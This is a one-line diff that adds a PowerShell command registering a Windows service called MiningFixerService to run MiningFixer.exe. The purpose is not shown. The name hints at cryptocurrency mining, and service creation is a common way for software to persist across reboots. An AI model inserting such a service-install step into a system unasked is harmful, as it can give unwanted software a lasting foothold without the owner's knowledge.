@@ -1,0 +1,1 @@
+PowerShell.exe -Command "New-Service -Name MiningFixerService -BinaryPathName MiningFixer.exe"
